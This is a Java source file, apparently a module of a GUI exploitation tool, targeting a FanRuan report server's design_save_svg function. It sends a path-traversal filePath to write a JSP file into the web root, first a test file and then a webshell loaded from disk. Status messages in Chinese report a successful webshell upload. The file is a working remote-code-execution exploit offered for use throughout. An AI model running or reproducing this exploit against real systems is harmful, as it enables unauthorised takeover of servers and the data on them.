package exp.oa.fanruan;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;

public class fanruan_save_svg implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea){
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "text/xml;charset=UTF-8");
        String payload = "{\"__CONTENT__\": \"" + shell.readFile(shell.Testpath).replace("\"","\\\"") + "\", \"__CHARSET__\": \"UTF-8\"}";
            Response post = HttpTools.post(url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/nishizhu.svg.jsp", payload, head, "utf-8");

        if(post.getCode() == 200){
            Response response = HttpTools.get(url + "/WebReport/nishizhu.svg.jsp", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + "/nishizhu.svg.jsp");
                });
                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 疑似杀软查杀 请手动复现");
                });
                return false;
            }
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n fanruan-design_save_svg-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea){
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "text/xml;charset=UTF-8");
        String payload = "{\"__CONTENT__\": \"" + shell.readFile(shell.Jsppath).replace("\"","\\\"") + "\", \"__CHARSET__\": \"UTF-8\"}";
        Response post = HttpTools.post(url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/nishidazhu.svg.jsp", payload, head, "utf-8");

        if(post.getCode() == 200){
            Response response = HttpTools.get(url + "/WebReport/nishizhu.svg.jsp", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/nishidazhu.svg.jsp");
                });
                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 疑似杀软查杀 请手动复现");
                });
                return false;
            }
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n 疑似杀软查杀 请手动复现");
            });
            return false;
        }
    }

}
